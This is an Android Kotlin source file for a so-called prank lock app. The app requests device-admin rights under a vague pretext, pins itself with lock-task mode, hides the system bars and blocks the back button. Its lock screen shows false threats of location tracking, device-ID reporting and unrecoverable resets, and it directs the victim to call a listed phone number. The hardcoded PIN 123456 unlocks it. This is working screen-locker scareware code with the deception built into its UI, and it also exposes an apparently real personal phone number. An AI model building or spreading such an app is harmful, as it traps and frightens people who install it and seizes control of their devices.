package com.prank.lockapp

import android.app.ActivityManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.Icon
import androidx.compose.material.LinearProgressIndicator
import androidx.compose.material.Text
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Lock
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import kotlinx.coroutines.delay
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        WindowCompat.setDecorFitsSystemWindows(window, false)
        WindowInsetsControllerCompat(window, window.decorView).apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior =
                WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        }

        devicePolicyManager =
            getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdmin::class.java)

        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Security lock ke liye zaroori hai"
                )
            }
            startActivity(intent)
        }

        setContent {
            var unlocked by remember { mutableStateOf(false) }
            val context = LocalContext.current
            BackHandler(enabled = !unlocked) { }

            if (unlocked) {
                LaunchedEffect(Unit) {
                    try { stopLockTask() } catch (e: Exception) { }
                    try { devicePolicyManager.lockNow() } catch (e: Exception) { }
                    finish()
                }
            } else {
                LockScreen { unlocked = true }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            @Suppress("DEPRECATION")
            if (am.lockTaskModeState == ActivityManager.LOCK_TASK_MODE_NONE) {
                startLockTask()
            }
        } catch (e: Exception) { }
    }
}

@Composable
fun LockScreen(onUnlock: () -> Unit) {
    val correctPin = "123456"
    val contactNumber = "+923427735164"
    var pin by remember { mutableStateOf("") }
    var wrongAttempts by remember { mutableStateOf(0) }
    var isTimedOut by remember { mutableStateOf(false) }
    var countdownSecs by remember { mutableStateOf(60) }
    var progress by remember { mutableStateOf(0f) }
    val context = LocalContext.current
    @Suppress("DEPRECATION")
    val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator

    // 1 minute lockout countdown
    LaunchedEffect(isTimedOut) {
        if (isTimedOut) {
            countdownSecs = 60
            progress = 0f
            for (i in 60 downTo 0) {
                countdownSecs = i
                progress = (60 - i) / 60f
                delay(1000)
            }
            isTimedOut = false
            wrongAttempts = 0
            pin = ""
        }
    }

    // Live clock
    var currentTime by remember { mutableStateOf(getTime()) }
    LaunchedEffect(Unit) {
        while (true) {
            currentTime = getTime()
            delay(1000)
        }
    }

    Box(Modifier.fillMaxSize()) {

        // Background image
        Image(
            painter = painterResource(id = R.drawable.lock_bg),
            contentDescription = null,
            modifier = Modifier.fillMaxSize(),
            contentScale = ContentScale.Crop
        )

        // Dark overlay for readability
        Box(
            Modifier
                .fillMaxSize()
                .background(Color.Black.copy(alpha = 0.72f))
        )

        Column(
            Modifier
                .fillMaxSize()
                .padding(horizontal = 24.dp, vertical = 32.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Top
        ) {

            Spacer(Modifier.height(40.dp))
            Text(
                currentTime,
                color = Color.White,
                fontSize = 52.sp,
                fontWeight = FontWeight.Light
            )
            Spacer(Modifier.height(4.dp))
            Text(
                "⚡ SECURITY SYSTEM ACTIVE",
                color = Color(0xFFCC00FF),
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold
            )
            Spacer(Modifier.height(20.dp))
            Icon(
                Icons.Filled.Lock,
                contentDescription = null,
                tint = Color(0xFFBB00FF),
                modifier = Modifier.size(50.dp)
            )
            Spacer(Modifier.height(12.dp))

            if (isTimedOut) {
                // --- Lockout screen ---
                Text(
                    "⛔ DEVICE TEMPORARILY LOCKED",
                    color = Color.Red,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )
                Spacer(Modifier.height(8.dp))
                Text(
                    "Too many wrong attempts detected!\nAll login activity is being monitored.\nPhone reset NOT guaranteed.",
                    color = Color.Red.copy(alpha = 0.9f),
                    fontSize = 12.sp,
                    textAlign = TextAlign.Center
                )
                Spacer(Modifier.height(12.dp))
                Text(
                    "Unlocking in: $countdownSecs sec",
                    color = Color.Yellow,
                    fontSize = 18.sp,
                    fontWeight = FontWeight.Bold
                )
                Spacer(Modifier.height(10.dp))
                LinearProgressIndicator(
                    progress = progress,
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(10.dp)
                        .clip(CircleShape),
                    color = Color.Red,
                    backgroundColor = Color(0xFF330000)
                )
                Spacer(Modifier.height(16.dp))
                Text("📍 Location: Being tracked", color = Color(0xFFCC00FF), fontSize = 11.sp)
                Text(
                    "🔒 Device ID logged & reported",
                    color = Color(0xFFCC00FF),
                    fontSize = 11.sp
                )
                Spacer(Modifier.height(12.dp))
                Text("Forgot PIN? Contact Owner:", color = Color.Gray, fontSize = 11.sp)
                Text(
                    contactNumber,
                    color = Color.Cyan,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold
                )
                Text("【 Official Security System 】", color = Color.Gray, fontSize = 10.sp)

            } else {
                // --- Normal lock screen ---
                if (wrongAttempts > 0) {
                    Text(
                        "⚠ SECURITY ALERT",
                        color = Color.Red,
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(Modifier.height(6.dp))
                    Text(
                        "Unauthorized access detected!\nThis attempt has been recorded.\nWrong passwords: ($wrongAttempts/3)\nPhone reset NOT guaranteed! ⚠",
                        color = Color.Red.copy(alpha = 0.9f),
                        fontSize = 12.sp,
                        textAlign = TextAlign.Center
                    )
                    Spacer(Modifier.height(8.dp))
                    Text("Forgot PIN? Contact Owner:", color = Color.Gray, fontSize = 11.sp)
                    Text(
                        contactNumber,
                        color = Color.Cyan,
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Text("【 Official Security System 】", color = Color.Gray, fontSize = 10.sp)
                    Spacer(Modifier.height(16.dp))
                } else {
                    Text(
                        "Enter PIN to unlock device",
                        color = Color.LightGray,
                        fontSize = 14.sp
                    )
                    Text(
                        "This device is security protected",
                        color = Color.Gray,
                        fontSize = 11.sp
                    )
                    Spacer(Modifier.height(20.dp))
                }

                // PIN dots
                Row(horizontalArrangement = Arrangement.spacedBy(14.dp)) {
                    repeat(6) { i ->
                        Box(
                            Modifier
                                .size(16.dp)
                                .clip(CircleShape)
                                .background(
                                    if (i < pin.length) Color(0xFFBB00FF) else Color.DarkGray
                                )
                        )
                    }
                }

                Spacer(Modifier.height(28.dp))

                // Numeric keypad
                val keys = listOf("1","2","3","4","5","6","7","8","9","","0","\u232B")
                Column(verticalArrangement = Arrangement.spacedBy(14.dp)) {
                    keys.chunked(3).forEach { row ->
                        Row(horizontalArrangement = Arrangement.spacedBy(28.dp)) {
                            row.forEach { key ->
                                Box(
                                    Modifier
                                        .size(72.dp)
                                        .clip(CircleShape)
                                        .background(
                                            if (key.isNotEmpty()) Color(0xFF1A0030)
                                            else Color.Transparent
                                        )
                                        .clickable(enabled = key.isNotEmpty() && !isTimedOut) {
                                            when (key) {
                                                "\u232B" -> {
                                                    if (pin.isNotEmpty()) pin = pin.dropLast(1)
                                                }
                                                else -> {
                                                    if (pin.length < 6) {
                                                        pin += key
                                                        if (pin.length == 6) {
                                                            if (pin == correctPin) {
                                                                onUnlock()
                                                            } else {
                                                                wrongAttempts++
                                                                @Suppress("DEPRECATION")
                                                                vibrator?.vibrate(
                                                                    VibrationEffect.createOneShot(
                                                                        600,
                                                                        VibrationEffect.DEFAULT_AMPLITUDE
                                                                    )
                                                                )
                                                                pin = ""
                                                                if (wrongAttempts >= 3) {
                                                                    isTimedOut = true
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        },
                                    contentAlignment = Alignment.Center
                                ) {
                                    Text(key, color = Color.White, fontSize = 22.sp)
                                }
                            }
                        }
                    }
                }

                Spacer(Modifier.height(20.dp))
                Text(
                    "⚡ Unauthorized access will be reported",
                    color = Color(0xFFCC00FF),
                    fontSize = 10.sp
                )
                Text(
                    "📍 Location tracking: ACTIVE",
                    color = Color(0xFFCC00FF),
                    fontSize = 10.sp
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Contact: $contactNumber | Official",
                    color = Color.Gray,
                    fontSize = 10.sp
                )
            }
        }
    }
}

fun getTime(): String {
    return SimpleDateFormat("hh:mm a", Locale.getDefault()).format(Date())
}
